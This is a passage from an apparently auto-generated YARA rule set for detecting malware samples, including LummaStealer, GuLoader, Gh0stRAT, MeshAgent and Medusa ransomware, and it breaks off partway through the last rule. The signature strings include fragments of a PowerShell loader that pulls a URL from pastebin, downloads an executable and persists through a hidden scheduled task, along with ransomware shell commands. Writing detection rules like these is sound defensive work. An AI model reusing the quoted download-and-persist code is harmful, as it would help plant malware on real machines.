/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-28
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule GCleaner_signature__651e57d4ccb1a3162fc07a2bd253eedd_imphash__909905bc {
   meta:
      description = "_subset_batch - file GCleaner(signature)_651e57d4ccb1a3162fc07a2bd253eedd(imphash)_909905bc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "909905bc8800c7ecee499411b741585ceed96ecf46099d3cc669a0bf70d621ee"
   strings:
      $s1 = "Alt+ Clipboard does not support Icons/Menu '%s' is already being used by another form" fullword wide /* score: '17.00'*/
      $s2 = "VTsyVSxxu" fullword ascii /* base64 encoded string 'U;2U,q' */ /* score: '14.00'*/
      $s3 = "TCommonDialog8" fullword ascii /* score: '13.00'*/
      $s4 = " http://crl.verisign.com/pca3.crl0" fullword ascii /* score: '13.00'*/
      $s5 = "Common Engineering Services1" fullword ascii /* score: '10.00'*/
      $s6 = "uwrcuw.cuw/5$" fullword ascii /* score: '10.00'*/
      $s7 = "4*$\\\\e?" fullword ascii /* score: '9.00'*/ /* hex encoded string 'N' */
      $s8 = "ContentType`" fullword ascii /* score: '9.00'*/
      $s9 = ":\\\\~5\"c" fullword ascii /* score: '9.00'*/ /* hex encoded string '\' */
      $s10 = "=!=%=3=7=;=\\=|=" fullword ascii /* score: '9.00'*/ /* hex encoded string '7' */
      $s11 = "xOZtlOgttdL" fullword ascii /* score: '9.00'*/
      $s12 = "`irCmi~~f\\m" fullword ascii /* score: '9.00'*/
      $s13 = ":$;3;B;^;" fullword ascii /* score: '9.00'*/ /* hex encoded string ';' */
      $s14 = "xqaIrc1Brc56" fullword ascii /* score: '9.00'*/
      $s15 = "InHeaderList" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      8 of them
}

rule GuLoader_signature__0293eec0b5432ad092f24065016203b2_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_0293eec0b5432ad092f24065016203b2(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "033dc2069bd1bc266894ed517e3c0209234dd51cddaa7e9e3d3c56e7b39a1007"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "chartroom.exe" fullword wide /* score: '22.00'*/
      $s6 = "nstall System v3.09</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s7 = "~nsu%X.tmp" fullword ascii /* score: '11.00'*/
      $s8 = "ZjRd:\\" fullword ascii /* score: '10.00'*/
      $s9 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s10 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
      $s11 = "bonbonens" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__671f2a1f8aee14d336bab98fea93d734_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_671f2a1f8aee14d336bab98fea93d734(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f76270967e9fda2201f6c82a66638b536de9ec7cab9978604f67dbca5d1867bf"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "ntrols\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssembl" ascii /* score: '25.00'*/
      $s4 = "dency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asIn" ascii /* score: '22.00'*/
      $s5 = "nstall System v3.09</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s6 = "~nsu%X.tmp" fullword ascii /* score: '11.00'*/
      $s7 = "er\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compatibi" ascii /* score: '10.00'*/
      $s8 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__ced282d9b261d1462772017fe2f6972b_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_ced282d9b261d1462772017fe2f6972b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b016171fa1e4af1800725fab364256974005bbed038c5ac298ec9ab186ed13c2"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $x2 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"*\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>Nu" ascii /* score: '31.00'*/
      $s3 = "Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></dependentAssem" ascii /* score: '25.00'*/
      $s4 = "endency><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"as" ascii /* score: '22.00'*/
      $s5 = "http://ocsp.digicert.com0]" fullword ascii /* score: '14.00'*/
      $s6 = "Qhttp://cacerts.digicert.com/DigiCertTrustedG4TimeStampingRSA4096SHA2562025CA1.crt0_" fullword ascii /* score: '13.00'*/
      $s7 = "Nhttp://crl3.digicert.com/DigiCertTrustedG4TimeStampingRSA4096SHA2562025CA1.crl0 " fullword ascii /* score: '13.00'*/
      $s8 = "nstall System v3.06.1</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Comm" ascii /* score: '13.00'*/
      $s9 = "oker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:schemas-microsoft-com:compati" ascii /* score: '10.00'*/
      $s10 = "CRYPTBASE" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__428ac1b290fc77ee46ce55daa005333b_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_428ac1b290fc77ee46ce55daa005333b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2c4b8be34028c43d6b251fba60d75b62d2b1b70373f8eb8104205e67471bc32d"
   strings:
      $s1 = "possum_villain_missed_headlessness_tattletale_food_acceptable_knife_poodle_regress_referee_juxtaposition_cello_hassling_vanilla_" ascii /* score: '23.00'*/
      $s2 = "reconnaissance_admissible_forget_woolly_copper_completely_enough_zealousness_oppress_already_piggish_boobs_difficult_rhythm_skil" ascii /* score: '18.00'*/
      $s3 = "illness_memory_accident_loquacious_geek_annals_hiccups_indeed_commit_goodness_fellatio_doll_dilemma_connect_opportunity_headstro" ascii /* score: '18.00'*/
      $s4 = "bookkeeper_addressing_assessments_touching_recommend_blossom_wheel_hassling_sniffed_kettle_between_gallop.ttf" fullword ascii /* score: '18.00'*/
      $s5 = "looking_minimum_wisdom_notice_quizzical_willpower_grammatical_terrible_quibbling_obsession_zoological_aggression_quell_fizz_form" wide /* score: '18.00'*/
      $s6 = "recommendation_gooey_otter_textless_textless_ballooning_quizzes_flatter_annex_sniffed_loofah_entitlement_chattanooga_freemasonry" wide /* score: '18.00'*/
      $s7 = "election_kiosk_irritate_rely_belligerent_forgiving_completely_annals_tunnel_sermon_momento_zombie_loofahs_purple_referee_possess" wide /* score: '18.00'*/
      $s8 = "killer_stutter_connecting_monster_slimmer_mommy_equal_insure_accommodate_doorbell_grapple_currant_territorial_ceiling_feedback_q" ascii /* score: '17.00'*/
      $s9 = "p_attention_mass_kilogram_jumping_irrigation_correct_shell_voluminous.ttf" fullword ascii /* score: '17.00'*/
      $s10 = "lookout_delicious_accede_fellowship_pylon_reelection_pillow_padding_teen_reel_sister_fuzzy_sassiness_permissible_effects_lollipo" ascii /* score: '17.00'*/
      $s11 = "vivid_forget_chocolate_toppermost_curriculum_billion_illiteracy_queueing_needless_tutting_food_immune_troops_forward_addressing" fullword ascii /* score: '17.00'*/
      $s12 = "ignore_lullaby_besee_sobbing_definitely_gripping_affliction_mass_reel_hoof_worried_mammogram_terrestrial_notice_millet_headlessn" wide /* score: '17.00'*/
      $s13 = "cellblock_feed_cooperation_lollipop_terror_soon_innovate_serious_flooding_reggae_blossom_delicious_permission" fullword wide /* score: '17.00'*/
      $s14 = "zucchini_staffing_jealous_cooperation_loss_cottage_caffeine_sobbing_fuzzy_spittoon_availability_breezed_arrow_raffle_sniffed_mil" wide /* score: '17.00'*/
      $s15 = "UPDATE temp.sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, 1) WHERE type IN ('trigger', 'view" ascii /* score: '16.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      8 of them
}

rule HijackLoader_signature__8176145028409aa62a5ba630fe78c43c_imphash_ {
   meta:
      description = "_subset_batch - file HijackLoader(signature)_8176145028409aa62a5ba630fe78c43c(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8227fae5fb4bf51b1ef9e1bc2fcf0c3188aec6166973e6acce5186dd17e682cf"
   strings:
      $s1 = "NTLM handshake failure (bad type-2 message). Target Info Offset Len is set incorrect by the peer" fullword ascii /* score: '20.00'*/
      $s2 = "http://www.digicert.com/CPS0" fullword ascii /* score: '17.00'*/
      $s3 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii /* score: '16.00'*/
      $s4 = "http://ocsp.digicert.com0\\" fullword ascii /* score: '14.00'*/
      $s5 = "Mhttp://crl3.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0S" fullword ascii /* score: '13.00'*/
      $s6 = "Phttp://cacerts.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crt0" fullword ascii /* score: '13.00'*/
      $s7 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0>" fullword ascii /* score: '13.00'*/
      $s8 = "username=\"%s\",realm=\"%s\",nonce=\"%s\",cnonce=\"%s\",nc=\"%s\",digest-uri=\"%s\",response=%s,qop=%s" fullword ascii /* score: '12.50'*/
      $s9 = "username=\"%s\", realm=\"%s\", nonce=\"%s\", uri=\"%s\", cnonce=\"%s\", nc=%08x, qop=%s, response=\"%s\"" fullword ascii /* score: '12.50'*/
      $s10 = "?1996 - 2015 Daniel Stenberg, <daniel@haxx.se>." fullword wide /* score: '12.00'*/
      $s11 = "Can't complete SOCKS4 connection to %d.%d.%d.%d:%d. (%d), request rejected because the client program and identd report differen" ascii /* score: '11.50'*/
      $s12 = "Can't complete SOCKS4 connection to %d.%d.%d.%d:%d. (%d), request rejected because SOCKS server cannot connect to identd on the " ascii /* score: '11.50'*/
      $s13 = " JJ5Jj" fullword ascii /* reversed goodware string 'jJ5JJ ' */ /* score: '11.00'*/
      $s14 = " HTTP/%d.%d %d" fullword ascii /* score: '10.00'*/
      $s15 = "Broutshealchairt.smo" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule Gh_stRAT_signature__5040b5762ca9dc51a91228b0c5635fcf_imphash_ {
   meta:
      description = "_subset_batch - file Gh-stRAT(signature)_5040b5762ca9dc51a91228b0c5635fcf(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "96f803648c16708270f354f9996d540c6781f490e4d46790d9f2c2719e66749a"
   strings:
      $x1 = "C:\\Users\\Public\\Favorites\\dll2.xor" fullword ascii /* score: '35.00'*/
      $x2 = "C:\\WINDOWS\\system32\\srvlic.dll" fullword ascii /* score: '34.00'*/
      $x3 = "C:\\WINDOWS\\system32\\mstracer.dll" fullword ascii /* score: '34.00'*/
      $x4 = "C:\\Windows\\system32\\srvlic.dll" fullword ascii /* score: '34.00'*/
      $x5 = "C:\\WINDOWS\\system32\\msTracer.dll" fullword ascii /* score: '34.00'*/
      $x6 = "C:\\Users\\Public\\Favorites\\ok.bin" fullword ascii /* score: '33.00'*/
      $s7 = "C:\\Users\\Public\\Favorites\\setting.ini" fullword ascii /* score: '30.00'*/
      $s8 = "C:\\Documents and Settings\\All Users\\Application Data\\dll2.xor" fullword ascii /* score: '28.00'*/
      $s9 = "C:\\Users\\Public\\Favorites\\" fullword ascii /* score: '27.00'*/
      $s10 = "\\shell32.dll" fullword ascii /* score: '26.00'*/
      $s11 = "C:\\Documents and Settings\\All Users\\Application Data\\ok.bin" fullword ascii /* score: '26.00'*/
      $s12 = "ProcCom.dll" fullword ascii /* score: '26.00'*/
      $s13 = "pass.exe" fullword ascii /* score: '25.00'*/
      $s14 = "runas.exe" fullword ascii /* score: '25.00'*/
      $s15 = "C:\\Users\\" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      1 of ($x*) and all of them
}

rule Gh_stRAT_signature__214dfb115b7e6022dd305ee96a6b0623_imphash_ {
   meta:
      description = "_subset_batch - file Gh-stRAT(signature)_214dfb115b7e6022dd305ee96a6b0623(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bd9583680651e5d2ae3709ce6fdbbc7bd296dcfcdbc2163160b9f6b3bdfbc1e7"
   strings:
      $s1 = "Server.exe" fullword wide /* score: '22.00'*/
      $s2 = "YYYYYYYYYYYYxe1fy0Qzq1Yye/giPhCjrlYY0vdWmPsu4mjVz3pBWDZrPnm1QJ/kntwKuZfuxtBo1FtPgeALdXJL0kIzxAeXCAxDeimm21J/68UZBNTfO+DNTBNtRipZ" ascii /* score: '15.00'*/
      $s3 = "YYYYYYYYYYYYxe1fy0Qzq1Yye/giPhCjrlYY0vdWmPsu4mjVz3pBWDZrPnm1QJ/kntwKuZfuxtBo1FtPgeALdXJL0kIzxAeXCAxDeimm21J/68UZBNTfO+DNTBNtRipZ" ascii /* score: '15.00'*/
      $s4 = ")\\Debug\\DHLDAT.pdb" fullword ascii /* score: '13.00'*/
      $s5 = "ImTlrevG2IUdru3s6VsoGn6lSMw1e7YEiKY6VHbuvo8O4cQ+K1ZiSdhjPyrhdVEpy0sZk9rjOuiAFSELQdazYfTM4GpMjay2v89YCFXnRgBZRohXSevI8FL1ZZEgS6oU" ascii /* score: '11.00'*/
      $s6 = "+YjYqA9A7U4gmaEQLyPaRSdWDylFq7bATToEqQNE8Xnb6vzZwqTXqSRy+RaWhbFNyUwUZ1D4EsO2pF0vzDY4wnnDEU+8/egrXjUIqcWy/Q1aS+WaKqLFwLJpJv9XH6tJ" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule Loki_signature__5a498eee87e4d89512a84502f500181f_imphash_ {
   meta:
      description = "_subset_batch - file Loki(signature)_5a498eee87e4d89512a84502f500181f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "cf484b708af3b5da5cbbe452a3a037dce1a3a1c1434f8181afe88294e50b17d8"
   strings:
      $s1 = "Signature Cloner.exe" fullword wide /* score: '19.00'*/
      $s2 = "TLOGINDIALOG" fullword wide /* score: '17.50'*/
      $s3 = "TPASSWORDDIALOG" fullword wide /* score: '14.50'*/
      $s4 = "\\,- -$/P" fullword ascii /* score: '10.00'*/
      $s5 = "DBINSERT" fullword wide /* score: '9.50'*/
      $s6 = "  level=\"asInvoker\"" fullword ascii /* score: '8.00'*/
      $s7 = "w1'\\%d%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d029797b4179de8ba30f1d5cb552cbbe8965a50b1e9a96eade82edc61079b356"
   strings:
      $s1 = "script.exe" fullword wide /* score: '28.00'*/
      $s2 = "        $action = New-ScheduledTaskAction -Execute $tempPath -ErrorAction SilentlyContinue" fullword ascii /* score: '27.00'*/
      $s3 = "    # Execute as background process" fullword ascii /* score: '21.00'*/
      $s4 = "if (Download-FileWithRetries -url $githubUrl -output $tempPath) {" fullword ascii /* score: '21.00'*/
      $s5 = "$tempPath = Join-Path $hiddenFolder \"background.exe\"" fullword ascii /* score: '18.00'*/
      $s6 = "$pastebinUrl = \"https://pastebin.com/raw/aftbwA1W\"" fullword ascii /* score: '17.00'*/
      $s7 = "        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType S4U -RunLevel Highest -ErrorAction SilentlyCont" ascii /* score: '17.00'*/
      $s8 = "        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType S4U -RunLevel Highest -ErrorAction SilentlyCont" ascii /* score: '17.00'*/
      $s9 = "# Main execution" fullword ascii /* score: '16.00'*/
      $s10 = "# Get GitHub URL from Pastebin" fullword ascii /* score: '16.00'*/
      $s11 = "    $githubUrl = (Invoke-WebRequest -Uri $pastebinUrl -UseBasicParsing -ErrorAction Stop).Content.Trim()" fullword ascii /* score: '14.00'*/
      $s12 = "        $startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden" fullword ascii /* score: '14.00'*/
      $s13 = "script.ps1" fullword wide /* score: '14.00'*/
      $s14 = "        $trigger = New-ScheduledTaskTrigger -AtLogOn -ErrorAction SilentlyContinue" fullword ascii /* score: '14.00'*/
      $s15 = "        Remove-Item $tempPath -Force -ErrorAction SilentlyContinue" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule MeshAgent_signature__7aa58492bf5691114c98568704d048cd_imphash_ {
   meta:
      description = "_subset_batch - file MeshAgent(signature)_7aa58492bf5691114c98568704d048cd(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b3394d237e9c5558b33b5cfb7da7178e625a4ef1a126c0b0d1b13ac2f2d73ceb"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\" xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><d" ascii /* score: '48.00'*/
      $x2 = "OytayL+doEwvJ7hWCwROBcuCqJSDwuKBqQWGxddXDrSLBzF/MifeEKYMlN/r8pgkVg12i2k9oBsea1EB1lWi10Tc7Ydot8T9av7MulSZbqUx/ZplhtNB8DytUTKvUThp" ascii /* score: '40.00'*/
      $x3 = "var _tmp = 'Detected OS: ' + require('os').Name; try{_tmp += (' - ' + require('os').arch());}catch(x){}console.log(_tmp);if(proc" ascii /* score: '40.00'*/
      $x4 = "ess.platform=='win32'){ _tmp=require('win-authenticode-opus')(process.execPath); if(_tmp!=null && _tmp.url!=null){ _tmp=require(" ascii /* score: '39.00'*/
      $x5 = "console.log(getSHA384FileHash(process.execPath).toString('hex').substring(0,16));process.exit();" fullword ascii /* score: '38.00'*/
      $x6 = "console.log(getSHA384FileHash(process.execPath).toString('hex'));process.exit();" fullword ascii /* score: '38.00'*/
      $x7 = "ScriptContainer.Create(): Error spawning child process, using [%s]" fullword ascii /* score: '37.00'*/
      $x8 = "eJycu1mPtFCc3nc/0nyHV3PjxIyHYodYlnLY950q4MZih6LYdz59eGfGjq1YkZLuVnVXcQrOOf/l+T10N/wf//EfuGG85qaq1z/oC0X+0/OA/lH6tfj94YZ5HOZkbYb+" ascii /* score: '36.00'*/
      $x9 = "process.coreDumpLocation = process.platform=='win32'?(process.execPath.replace('.exe', '.dmp')):(process.execPath + '.dmp');" fullword ascii /* score: '35.00'*/
      $x10 = "child.stdin.write('lsof -p ' + (pid ? pid : process.pid) + '\\nexit\\n');" fullword ascii /* score: '33.00'*/
      $x11 = "var _tmp=require('child_process').execFile('/bin/sh', ['sh']);_tmp.stdout.on('data', function (){});_tmp.stdin.write('loginctl k" ascii /* score: '33.00'*/
      $x12 = "XjIxk7rxFUfHalEkwFEoOCoCbWC3+VDPG2Wc4xvHdqFw5JacenmA+NoEEaehVikJ8GiJbTQDe6GEs6Fo++SLr3BfEHQZ4npk9OsVaR6sePSpCGaJCuLqNX3aW+U+byZV" ascii /* score: '33.00'*/
      $x13 = "eJzsu9my60hyLfheZvUPx/Qi6UIqzANbV2aNeZ4HAngpAzETMwgQANv63zuYmVWVWaUr6XZbv9U2O4fcDI/Jw335WkRs+H/8/nf8NF9rWzfbDwxBb/+KIRj2Qx23sv/B" ascii /* score: '32.00'*/
      $x14 = "%s\\system32\\cmd.exe" fullword wide /* score: '32.00'*/
      $x15 = "process.versions.commitHash" fullword ascii /* score: '31.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      1 of ($x*)
}

rule HijackLoader_signature__492a5d3560401c2811de048088bf91d0_imphash_ {
   meta:
      description = "_subset_batch - file HijackLoader(signature)_492a5d3560401c2811de048088bf91d0(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f2b307c985cd781039b54ce7fd7ec58b14f2cb8b55cacd6fa987a291c4082b4f"
   strings:
      $x1 = "srvcli.dll" fullword wide /* reversed goodware string 'lld.ilcvrs' */ /* score: '33.00'*/
      $x2 = "devrtl.dll" fullword wide /* reversed goodware string 'lld.ltrved' */ /* score: '33.00'*/
      $x3 = "dfscli.dll" fullword wide /* reversed goodware string 'lld.ilcsfd' */ /* score: '33.00'*/
      $x4 = "browcli.dll" fullword wide /* reversed goodware string 'lld.ilcworb' */ /* score: '33.00'*/
      $x5 = "linkinfo.dll" fullword wide /* reversed goodware string 'lld.ofniknil' */ /* score: '33.00'*/
      $s6 = "atl.dll" fullword wide /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
      $s7 = "ScannerCircuit91.exe" fullword ascii /* score: '28.00'*/
      $s8 = "Setup=ScannerCircuit91.exe" fullword ascii /* score: '25.00'*/
      $s9 = "SSPICLI.DLL" fullword wide /* score: '23.00'*/
      $s10 = "UXTheme.dll" fullword wide /* score: '23.00'*/
      $s11 = "oleaccrc.dll" fullword wide /* score: '23.00'*/
      $s12 = "dnsapi.DLL" fullword wide /* score: '23.00'*/
      $s13 = "iphlpapi.DLL" fullword wide /* score: '23.00'*/
      $s14 = "WINNSI.DLL" fullword wide /* score: '23.00'*/
      $s15 = "sfxzip.exe" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 18000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__0a5f762c46ae2a8b364917c90f1df46a_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_0a5f762c46ae2a8b364917c90f1df46a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e91f79999728911847313f70ec1ac76ff5965b43c929bc4db7c2f55d62f353d2"
   strings:
      $s1 = "icu.dll" fullword wide /* score: '20.00'*/
      $s2 = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" fullword ascii /* score: '17.00'*/
      $s3 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" fullword ascii /* score: '17.00'*/
      $s4 = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" fullword ascii /* score: '17.00'*/
      $s5 = "C:\\local\\boost_1_75_0\\boost/uuid/detail/sha1.hpp" fullword ascii /* score: '15.00'*/
      $s6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s7 = "APPBKEYREAD" fullword ascii /* score: '12.50'*/
      $s8 = "AppPolicyGetThreadInitializationType" fullword ascii /* score: '12.00'*/
      $s9 = "attempting to parse an empty input; check that your input string or stream contains the expected JSON" fullword ascii /* score: '11.00'*/
      $s10 = "temp_directory_path" fullword ascii /* score: '11.00'*/
      $s11 = "APPBKEYWRITE" fullword ascii /* score: '9.50'*/
      $s12 = "APPBKEYR" fullword ascii /* score: '9.50'*/
      $s13 = "APPBKEYW" fullword ascii /* score: '9.50'*/
      $s14 = "object key" fullword ascii /* score: '9.00'*/
      $s15 = "<-<3<:<A<" fullword ascii /* score: '9.00'*/ /* hex encoded string ':' */
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule LummaStealer_signature__0c78abc5235b66488060fba1d5d75393_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_0c78abc5235b66488060fba1d5d75393(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "a9c47f10d5eb77d7d6b356be00b4814a7c1e5bb75739b464beb6ea03fc36cc85"
   strings:
      $s1 = "icu.dll" fullword wide /* score: '20.00'*/
      $s2 = "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" fullword ascii /* score: '17.00'*/
      $s3 = "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" fullword ascii /* score: '17.00'*/
      $s4 = "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" fullword ascii /* score: '17.00'*/
      $s5 = "C:\\local\\boost_1_75_0\\boost/uuid/detail/sha1.hpp" fullword ascii /* score: '15.00'*/
      $s6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s7 = "APPBKEYREAD" fullword ascii /* score: '12.50'*/
      $s8 = "attempting to parse an empty input; check that your input string or stream contains the expected JSON" fullword ascii /* score: '11.00'*/
      $s9 = "APPBKEYWRITE" fullword ascii /* score: '9.50'*/
      $s10 = "APPBKEYR" fullword ascii /* score: '9.50'*/
      $s11 = "APPBKEYW" fullword ascii /* score: '9.50'*/
      $s12 = "object key" fullword ascii /* score: '9.00'*/
      $s13 = ">,>7>E>_>" fullword ascii /* score: '9.00'*/ /* hex encoded string '~' */
      $s14 = "ucal_getTZDataVersion" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Loda_signature__ef471c0edf1877cd5a881a6a8bf647b9_imphash_ {
   meta:
      description = "_subset_batch - file Loda(signature)_ef471c0edf1877cd5a881a6a8bf647b9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "714bbd536eef62426a3900b43432e02cbf59ca9529f78106b0b1d3569d44acb0"
   strings:
      $s1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" language=\"*\" processorArchitec" ascii /* score: '26.00'*/
      $s2 = "kernel32.dllE" fullword ascii /* score: '16.00'*/
      $s3 = " publicKeyToken=\"6595b64144ccf1df\"/>" fullword ascii /* score: '13.00'*/
      $s4 = "logfth" fullword ascii /* score: '10.00'*/
      $s5 = "GetValu" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule Medusa_signature__1cc690a422707db94dd0913cd9980c27_imphash_ {
   meta:
      description = "_subset_batch - file Medusa(signature)_1cc690a422707db94dd0913cd9980c27(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6d000a159fe10af1b29ddf4e4015931a9e9d0a020aeef0c602d8c5419b5966e6"
   strings:
      $x1 = "\\SysWOW64\\cmd.exe /c %windir%\\sysnative\\cmd.exe /c " fullword wide /* score: '38.00'*/
      $x2 = "[!] Failed to run non elevated command: %s. Error: %s" fullword wide /* score: '33.00'*/
      $x3 = "taskkill /f /im explorer.exe" fullword wide /* score: '31.00'*/
      $s4 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s5 = "J:\\edu\\niggerProject\\bin\\Publish\\locker_win_x64_encrypter.pdb" fullword ascii /* score: '27.00'*/
      $s6 = "[!] Failed to get process ID" fullword wide /* score: '23.00'*/
      $s7 = "support@example.com" fullword ascii /* score: '21.00'*/
